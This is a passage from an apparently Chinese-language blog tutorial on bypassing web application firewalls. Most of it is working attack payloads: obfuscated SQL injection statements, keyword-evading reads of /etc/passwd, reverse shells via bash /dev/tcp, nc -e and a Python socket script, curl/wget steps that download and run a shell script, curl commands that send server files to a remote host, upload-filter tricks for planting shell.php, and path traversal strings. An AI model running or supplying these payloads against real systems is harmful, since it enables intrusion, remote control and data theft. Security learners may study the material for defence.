通过GeometryCollection()报错,注入语句如下:</span><br><span class="line">    and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line">(8) 通过polygon ()报错,注入语句如下:</span><br><span class="line">    and polygon((select * from(select * from(select user())a)b));</span><br><span class="line">(9) 通过multipoint ()报错,注入语句如下:</span><br><span class="line">    and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line">(10) 通过multilinestring()报错,注入语句如下:</span><br><span class="line">    and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line">(11) 通过multipolygon()报错,注入语句如下:</span><br><span class="line">    and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line">(12) 通过linestring ()报错,注入语句如下:</span><br><span class="line">    and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+<p>利用Error-based的SQL注入函数进行绕过时，可以结合函数分隔符，或其他方法灵活运用。</p>
+</li>
+<li><p>过滤特殊字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(1)limit处的逗号： limit 1 offset 0</span><br><span class="line">(2)字符串截取处的逗号 mid处的逗号： mid(version() from 1 for 1)</span><br><span class="line">(3)union处的逗号： 通过join拼接。</span><br><span class="line">SELECT * FROM admin WHERE username = 1 union select * from (select 1)a join(select&#123;x schema_name&#125; from information_schema.SCHEMATA limit 1,1)b</span><br><span class="line">(4)操作符&lt;&gt;被过滤</span><br><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span><br><span class="line">此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。那么上面的这条sql语句可以使用greatest变为如下的子句:</span><br><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64总结：使用greatest()绕过比较操作符。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>运算符</strong></p>
+<blockquote>
+<p>判断注入时，可以充分利用这些机制</p>
+</blockquote>
+<ul>
+<li>算数运算符</li>
+<li>比较运算符</li>
+<li>逻辑运算符</li>
+<li>位运算符</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select &apos;12345&apos; like &apos;123%&apos;		#更方便的布尔吧</span><br><span class="line">select &apos;beiji&apos; REGEXP &apos;ji&apos;</span><br><span class="line">select !(0|3&lt;&gt;3) 				#绕过and or xor || &amp;&amp;</span><br><span class="line">select 1^(0|3&lt;&gt;2)</span><br><span class="line">select 1&gt;&gt;!(1=0)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>其他函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查找索引：返回的索引（从1开始的位置）的str在str1，str2，...列表中。如果str没有找到，则返回0。</span><br><span class="line">FIELD(str,str1,str2,str3,...)</span><br><span class="line">#bit_count 二进制数中包含1的个数。 </span><br><span class="line">BIT_COUNT(10);因为10转成二进制是1010，所以该结果就是2</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="（2）由点及线"><a href="#（2）由点及线" class="headerlink" title="（2）由点及线"></a>（2）由点及线</h4><p>可以收集整理语句每个位置可以插入哪些字符进行混淆，在实际测试过程中，将payload拆分按位置逐个绕过</p>
+<p>例句形式常见有5个位置即：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE username = </span><br><span class="line">-1【位置一】union【位置二】select【位置三】1,user()【位置四】from【位置五】admin</span><br></pre></td></tr></table></figure>
+<p><strong>位置一 union之前</strong></p>
+<ul>
+<li><p>科学计数法 <code>1E0union</code></p>
+</li>
+<li><p>浮点数 <code>1.0union</code> <code>1.union</code> 等形式</p>
+</li>
+<li><p>浮点数特殊形式 <code>%1.union</code> <code>%2.union</code> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =-1%23.union select 1,2,3 from users</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>\N形式 <code>\Nunion</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =\Nunion select 1,2,3 from users</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>位置二 union和select之间</strong></p>
+<ul>
+<li><code>()</code>包裹select语句</li>
+<li>union <strong>distinct</strong> select</li>
+</ul>
+<p><strong>位置三 select之后</strong></p>
+<ul>
+<li>特殊字符 <code>!</code> <code>+</code> <code>-</code> <code>@</code> <code>~</code><br>上面字符除<code>@</code>外，可单个或随机自由数量组合使用 如<code>select!~!!!-+~@1,2,3</code></li>
+<li>引号:单/双/反引号 <code>select&quot;1&quot;,2,3</code></li>
+<li>\N形式 <code>select\N,2,3</code></li>
+<li>花括号形式 <code>select{x 1},2,3</code></li>
+</ul>
+<p><strong>位置四 from之前</strong></p>
+<ul>
+<li><p>科学计数法 <code>select 1,2,3E0from</code></p>
+</li>
+<li><p>浮点数 <code>select 1,2,3.0from</code> 或 <code>3.from</code></p>
+</li>
+<li><p>浮点数特殊形式 <code>%1.from</code> <code>%2.from</code> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select`username`,password,1%3.from users</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>\N形式 <code>select 1,2,\Nfrom</code></p>
+</li>
+<li><p>带括号的函数 如<code>select 1,2,user()from</code></p>
+</li>
+<li><p>破浪号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3`任意字符`from</span><br><span class="line">select 1,2,`id`from</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>破浪号后加任意字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3`booglefrom		#后面只能识别为字段名</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>花括号形式 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,&#123;x 3&#125;from</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>位置五 from之后</strong></p>
+<ul>
+<li><p>破浪号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 from`user		#后面只能识别为表名</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>破浪号包裹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 from`user`</span><br><span class="line">select 1,2,3 from`user`xxxxx</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>括号<code>()</code>包裹 <code>select 1,2,3 from(user)</code></p>
+</li>
+<li><p>花括号形式 <code>select 1,2,3 from{x user}</code></p>
+</li>
+<li><p>查询同一个表的情况下，可以加任意数字字母 <code>select * from user where id = -1 union select 1,user(),3 fromboogle123user</code>（没成功啊）</p>
+</li>
+<li><p>库名表名中间可以加空格<code>information_schema . tables</code></p>
+</li>
+</ul>
+<h4 id="（3）容器特性"><a href="#（3）容器特性" class="headerlink" title="（3）容器特性"></a>（3）容器特性</h4><p><strong>HPP重复参数污染</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+------------------------------------------------------------------+</span><br><span class="line">| Web Server      | Parameter Interpretation         | Example     |</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">| ASP.NET/IIS     | Concatenation by comma       | par1=val1,val2  |</span><br><span class="line">| ASP/IIS         | Concatenation by comma       | par1=val1,val2  |</span><br><span class="line">| PHP/Apache      | The last param is resulting  | par1=val2       |</span><br><span class="line">| JSP/Tomcat      | The first param is resulting | par1=val1       |</span><br><span class="line">| Perl/Apache     | The first param is resulting | par1=val1       |</span><br><span class="line">| DBMan           | Concatenation by two tildes  | par1=val1~~val2 |</span><br><span class="line">+------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+<p><strong>参数污染</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| Query String    |    Web Servers response / GET values    |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|         | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP             |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| ?test[1=2       | test_1=2             | test[1=2         |</span><br><span class="line">| ?test=%         | test=%               | test=            |</span><br><span class="line">| ?test%00=1      | test=1               | test=1           |</span><br><span class="line">| ?test=1%001     | NULL                 | test=1           |</span><br><span class="line">| ?test+d=1+2     | test_d=1 2           | test d=1 2       |</span><br><span class="line">+-----------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+<h4 id="（4）检测注入点"><a href="#（4）检测注入点" class="headerlink" title="（4）检测注入点"></a>（4）检测注入点</h4><p>Bypass WAF的第一步是识别注入点，我们拿到一个URL，第一步判断参数是否有注入，然后再进行后续的绕过。简单的and 1=1 and 1=2判断肯定会被WAF拦截，我们需转变思路进行绕过，一般WAF为了平衡风险和业务的关系不会对下面数字型探测方式进行拦截，否则会产生大量误报影响正常业务运行。</p>
+<p><strong>运算符</strong></p>
+<blockquote>
+<p>判断注入时，可以充分利用这些机制</p>
+</blockquote>
+<ul>
+<li>算数运算符</li>
+<li>比较运算符</li>
+<li>逻辑运算符</li>
+<li>位运算符</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select &apos;12345&apos; like &apos;123%&apos;		#更方便的布尔吧</span><br><span class="line">select &apos;beiji&apos; REGEXP &apos;ji&apos;</span><br><span class="line">select !(0|3&lt;&gt;3) 				#绕过and or xor || &amp;&amp;</span><br><span class="line">select 1^(0|3&lt;&gt;2)</span><br><span class="line">select 1&gt;&gt;!(1=0)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/20/WAF普及篇/15196361991311.png" alt="t-2.png"></p>
+<p><img src="/2020/05/20/WAF普及篇/15196361998652.png" alt="t-3.png"></p>
+<p><img src="/2020/05/20/WAF普及篇/15196361999516.png" alt="t-4.png"></p>
+<p>如果<code>and</code>也会拦截，可以直接在参数上进行类似判断操作，如<code>id=1*0</code> 、<code>id=1*2</code>，除了以上方法，还有很多其它衍生出的识别绕过方法（比如：<code>and{`</code>1=1}`）</p>
+<h4 id="（5）自动化思路"><a href="#（5）自动化思路" class="headerlink" title="（5）自动化思路"></a>（5）自动化思路</h4><ol>
+<li><p>可以编写Sqlmap Tamper脚本</p>
+</li>
+<li><p>超级 SQL 注入工具的关键字替换，并保存为模板</p>
+</li>
+</ol>
+<h4 id="（6）规则对抗经验"><a href="#（6）规则对抗经验" class="headerlink" title="（6）规则对抗经验"></a>（6）规则对抗经验</h4><p>在实际规则对抗过程中，有以下方法个人感觉比较好用些：</p>
+<ol>
+<li><p>针对单注释符/**/或者换行符%0A无强硬拦截的话，以此为基础结合其他混淆方式的多种组合，绕的还是比较快的（比如阿里云、腾讯云大概是这样的）</p>
+</li>
+<li><p>针对某一WAF产品，可以查看相关已公开分享的一些方法，即使一般都已经失效，但可以吸收核心绕过思路和方法组合，自行检查因为哪一块儿内容被识别拦截，稍加改动继续混淆即可快速绕过。（偷懒绕法）</p>
+<p>​    举例：<a href="https://paper.seebug.org/218/#0x05" target="_blank" rel="noopener">https://paper.seebug.org/218/#0x05</a></p>
+<p><img src="/2020/05/20/WAF普及篇/image-20200905112523356.png" alt="image-20200905112523356"></p>
+<p><img src="/2020/05/20/WAF普及篇/image-20191211174253019.png" alt="image-20191211174253019"></p>
+<p>当然，规则方面想具备较强绕过能力无惧任何WAF，除了对WAF本身的特性足够了解之外，还要对T-SQL语法非常熟悉，在这里也只是简单整理了一些公开的内容及思路，可以先带入门，后面的还需要自己深入研究。</p>
+</li>
+</ol>
+<h3 id="2-XXE"><a href="#2-XXE" class="headerlink" title="2. XXE"></a>2. XXE</h3><h4 id="（1）实体化编码"><a href="#（1）实体化编码" class="headerlink" title="（1）实体化编码"></a>（1）实体化编码</h4><p>待补充，待测试（理论上ok）</p>
+<h3 id="3-命令执行"><a href="#3-命令执行" class="headerlink" title="3. 命令执行"></a>3. 命令执行</h3><h4 id="（1）空格绕过"><a href="#（1）空格绕过" class="headerlink" title="（1）空格绕过"></a>（1）空格绕过</h4><p><strong>a. Linux</strong></p>
+<p>以<code>cat /etc/passwd</code>命令为例，在Linux bash环境下去掉空格的写法如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;/etc/passwd</span><br><span class="line">&#123;cat,/etc/passwd&#125;</span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS/etc/passwd</span></span><br><span class="line">X=$'cat\x20/etc/passwd'&amp;&amp;$X</span><br></pre></td></tr></table></figure>
+<p><strong>b. Windows</strong></p>
+<p>以<code>ping baidu.com</code>为例，在windows CMD中替换空格的写法如下：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ping</span><span class="variable">%CommonProgramFiles:~10,-18%</span>baidu.com</span><br><span class="line"><span class="built_in">ping</span><span class="variable">%PROGRAMFILES:~10,-5%</span>baidu.com</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>当需要执行命令来读取文件时，很大概率需要一个空格字符或者斜杠。</p>
+</blockquote>
+<h4 id="（2）关键字绕过"><a href="#（2）关键字绕过" class="headerlink" title="（2）关键字绕过"></a>（2）关键字绕过</h4><p><strong>a. 通配符绕过</strong></p>
+<p>若通过通配符绕过关键字，则linux bash的通配符与windows的类似，支持使用<code>?</code>代表单个字符和使用<code>*</code>代表多个字符的写法，如<code>/bin/cat /etc/passwd</code>命令可以有以下写法：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看文件</span></span><br><span class="line">/???/??t /???/p??s??</span><br><span class="line">/b??/ca? /e?c/pas?wd</span><br><span class="line">/b*/ca* /et*/pas*d</span><br><span class="line">/b??/ca* /e?c/pas*d</span><br><span class="line">/bin/cat /etc/passwd</span><br><span class="line"><span class="meta">#</span><span class="bash">nc</span></span><br><span class="line">/???/n? -e /???/b??h 2130706433 1337	</span><br><span class="line">/bin/nc -e /bin/bash 127.0.0.1  1337</span><br><span class="line">/???/?c.??????????? -e /???/b??h 2130706433 1337</span><br><span class="line">/bin/nc.traditional -3 /bin/bash 127.0.0.1  1337</span><br><span class="line"><span class="meta">#</span><span class="bash">使用<span class="built_in">echo</span> 枚举文件</span></span><br><span class="line">echo/*/*ss*</span><br></pre></td></tr></table></figure>
+<p><strong>b. 连接符混淆</strong></p>
+<p>在Linux的bash环境下想要绕过关键字，则可以插入成对的单引号、双引号或反引号，其中反引号必须连着写，比如可以将<code>cat /etc/passwd</code>写为以下形式：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c'a't /e't'c/p'a's's''w'd</span><br><span class="line">c""at /e't'c/pass""wd</span><br><span class="line">c""at /e't'c/pas``s``wd</span><br></pre></td></tr></table></figure>
+<p><strong>c. 反斜杠混淆</strong></p>
+<blockquote>
+<p>在传入payload的时候可能需要两个<code>\\</code></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/b\in/c\at /et\c/pas\swd</span><br></pre></td></tr></table></figure>
+<p><strong>d. 变量混淆</strong></p>
+<p>另外，也可以在shell命令的任意位置插入<code>$@</code>，或者在单词结尾处插入<code>$x</code>，这里的<code>x</code>可以是任意字母，例如可以写成如下形式：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">c$</span><span class="bash">@at /e<span class="variable">$@tc</span>/pas<span class="variable">$@swd</span></span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">x /etc<span class="variable">$x</span>/passwd<span class="variable">$x</span></span></span><br><span class="line"><span class="meta">ca$</span><span class="bash">@t /etc<span class="variable">$x</span>/passwd<span class="variable">$x</span></span></span><br></pre></td></tr></table></figure>
+<p><strong>d. 编码绕过</strong></p>
+<p>若通过编码绕过关键字，则可以将cat /etc/passwd进行base64编码，写法如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh</span><br></pre></td></tr></table></figure>
+<p><strong>e. 脚本混淆</strong></p>
+<p>除此之外，还可以通过一些脚本执行引擎，如perl、python、nodejs、php、java等来绕过WAF关键字，相关写法如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">perl -e '$a="ca";$b="t /et";$c="c/pas";exec($a.$b.$c."swd");'</span><br><span class="line">python -c 'import subprocess;subprocess.call(["ca"+"t","/et"+"c/pa"+"sswd"]);'</span><br><span class="line">php -r 'exec("ca"."t /et"."c/pa"."sswd");'</span><br></pre></td></tr></table></figure>
+<h4 id="（3）获得shell"><a href="#（3）获得shell" class="headerlink" title="（3）获得shell"></a>（3）获得shell</h4><p>假如目标机器没有nc等可以简单实现反弹shell的环境，采用其他形式比如<code>bash -i</code>或者php、perl、python等语言来获得shell，又会因为字符过于复杂被拦截：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/1.1.1.1/1337 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>那么就可以先将脚本或者木马上传到目标机器上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">!/usr/bin/python</span><br><span class="line">import socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&quot;&lt;my ip address&gt;&quot;,2375));</span><br><span class="line">os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1);</span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure>
+<p>然后执行脚本文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -v '.../?zzz=&lt;myip&gt;:2375/shell.py+-o+/tmp/shell.py'</span><br><span class="line"><span class="meta">#</span><span class="bash">或者使用wget</span></span><br><span class="line">.../?zzz=wg'e't 168431108 -P tmp</span><br><span class="line">.../?zzz=c'hm'od 777 -R tmp</span><br><span class="line">.../?zzz=/t'm'p/index.html</span><br></pre></td></tr></table></figure>
+<h4 id="（4）转换函数绕过"><a href="#（4）转换函数绕过" class="headerlink" title="（4）转换函数绕过"></a>（4）转换函数绕过</h4><p>有两个小东西叫做<code>normalizePath</code>和<code>cmdLine</code>。在ModSecurity中，它们被称为“转换函数”，用于将用户输入的原始数据先转换，然后再匹配。如果WAF认为数据无害，才会发送原始数据到Web服务器。</p>
+<p><code>normalizePath</code>：它会删除字符串中的多个斜杠、目录的自引用和目录的上级引用（除了最开始的输入）。</p>
+<p><code>cmdLine</code>：由Marc Stern开发，会将所有的输入规范化，例如<code>/e&#39;t&#39;c/pa&#39;ss&#39;wd</code>会被转换规范为<code>/etc/passwd</code>。总之它可以做很多事：</p>
+<ul>
+<li>删除所有反斜杠</li>
+<li>删除所有双引号</li>
+<li>删除所有单引号</li>
+<li>删除所有前插符</li>
+<li>删除斜线前的空格</li>
+<li>删除左括号前的空格</li>
+<li>将所有逗号和分号替换为空格</li>
+<li>将多个空格（包括制表符、换行符等）替换为一个空格</li>
+<li>将所有字符转换为小写</li>
+</ul>
+<p>虽然黑名单文件拦截无法访问，但是源码文件一般还是ok的</p>
+<p>比如curl可以利用POST的HTTP请求将文件发送到远程服务器，命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -d @/&lt;file&gt; &lt;remote server&gt;</span><br><span class="line">curl ".../?zzz=-d+%40/usr/local/.../index.php+1.1.1.1:1337"</span><br></pre></td></tr></table></figure>
+<h3 id="4-代码执行"><a href="#4-代码执行" class="headerlink" title="4. 代码执行"></a>4. 代码执行</h3><h4 id="（1）PHP"><a href="#（1）PHP" class="headerlink" title="（1）PHP"></a>（1）PHP</h4><p>利用PHP数组特性绕过WAF策略；在PHP中每个字符串都可以当作数组，这样基于字符串的正则匹配就很容易被绕过了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$a=&quot;elmsty/ &quot;;($a[3].$a[5].$a[3].$a[4].$a[0].$a[2])($a[1].$a[3].$a[-1].$a[-2].tmp);&apos;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>其他语言待补充</p>
+</blockquote>
+<h3 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5. 文件上传"></a>5. 文件上传</h3><p>以PHP Web Server对<code>multipart/form-data</code>的解析作为例子。</p>
+<h4 id="（1）重复参数污染"><a href="#（1）重复参数污染" class="headerlink" title="（1）重复参数污染"></a>（1）重复参数污染</h4><p>由于该协议对PHP对解析存在缺陷，使得如果一行有多个filename字段值，则PHP Web Server会取最后一个filename值。</p>
+<p><strong>多个字段</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="a.txt"; filename="a.php";</span><br></pre></td></tr></table></figure>
+<p><strong>多个Content-Disposition</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="a.jpg";</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="a.php";</span><br></pre></td></tr></table></figure>
+<p>PHP Web Server最终得到的文件名是<code>a.php</code>，而某些WAF只判断第一个filename的值，因此WAF对上传的文件的过滤检测功能会被黑客绕过，并且这里的<code>form-data</code>可有可无，将其去掉也不影响PHP Web Server获取<code>filename</code>。</p>
+<p><strong>结合Charset编码</strong></p>
+<p>此外，<code>filename</code>的编码还受HTTP请求<code>Content-Type</code>头中<code>charset</code>的影响，PHP Web Server可以根据这个值进行解码处理。这些都有可能被一些人稍微做点手脚，便可以绕过不少WAF的文件上传过滤检测功能。</p>
+<h4 id="（2）换行绕过"><a href="#（2）换行绕过" class="headerlink" title="（2）换行绕过"></a>（2）换行绕过</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="test.jpg</span><br><span class="line"><span class="attribute">s/shell.php</span></span><br></pre></td></tr></table></figure>
+<h4 id="（3）遗漏文件名"><a href="#（3）遗漏文件名" class="headerlink" title="（3）遗漏文件名"></a>（3）遗漏文件名</h4><p>当WAF遇到“name=”myfile”;;”时，认为没有解析到filename。而后端容器继续解析到的文件名是t3.jsp，导致WAF被绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data;name=&quot;myfile&quot;;; filename=&quot;t3.jsp&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="（4）未解析所有文件"><a href="#（4）未解析所有文件" class="headerlink" title="（4）未解析所有文件"></a>（4）未解析所有文件</h4><p>multipart协议中，一个POST请求可以同时上传多个文件。如图，许多WAF只检查第一个上传文件，没有检查上传的所有文件，而实际后端容器会解析所有上传的文件名，攻击者只需把paylaod放在后面的文件PART，即可绕过。</p>
+<h4 id="（5）文件名解析兼容性"><a href="#（5）文件名解析兼容性" class="headerlink" title="（5）文件名解析兼容性"></a>（5）文件名解析兼容性</h4><p>multipart协议中，文件名的形式为“filename=”abc.php””。但是Tomcat、PHP等容器解析协议时会做一些兼容，能正确解析 ”filename=”abc.php”、”filename=abc.php”、 ”filename=’abc.php’”。而WAF只按照协议标准去解析，无法解析文件名，但是后端容器能正确获得文件名，从而导致被绕过。场景的绕过形式：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename=abc.php</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="abc.php</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename='abc.php’</span><br><span class="line">filename==="shell';.php</span><br></pre></td></tr></table></figure>
+<h4 id="6-文件内容检测"><a href="#6-文件内容检测" class="headerlink" title="(6)文件内容检测"></a>(6)文件内容检测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/php&quot;&gt;</span><br><span class="line">	#Script Type PHP</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;??&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="6-路径限制"><a href="#6-路径限制" class="headerlink" title="6. 路径限制"></a>6. 路径限制</h3><p>文件操作相关的功能处</p>
+<h4 id="（1）后台访问限制"><a href="#（1）后台访问限制" class="headerlink" title="（1）后台访问限制"></a>（1）后台访问限制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/myapp/admin.php?userid=1001	</span><br><span class="line">/myapp/admin.php/xyz?userid=X			#tomcat不支持</span><br><span class="line">/myapp/admin.php;random=value?userid=X	#tomcat支持</span><br><span class="line">/myapp;param=value/admin.php?userid=X	#tomcat支持</span><br></pre></td></tr></table></figure>
+<h4 id="（2）针对路径匹配"><a href="#（2）针对路径匹配" class="headerlink" title="（2）针对路径匹配"></a>（2）针对路径匹配</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/myapp//admin.php</span><br><span class="line">/myapp/./admin.php</span><br><span class="line">/myapp/xyz/../admin.php</span><br><span class="line">/myapp\admin.php</span><br><span class="line">/myapp/AdMiN.php</span><br></pre></td></tr></table></figure>
+<h4 id="（3）相对路径绕过"><a href="#（3）相对路径绕过" class="headerlink" title="（3）相对路径绕过"></a>（3）相对路径绕过</h4><p>实现目录穿越</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../../../../../../../../		../要足够多</span><br></pre></td></tr></table></figure>
+<p>如果../被替换为空，可以尝试双写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..././</span><br><span class="line">.....///</span><br></pre></td></tr></table></figure>
+<p>如果../被拦截，还可以利用正则（要看中间件是否支持）</p>
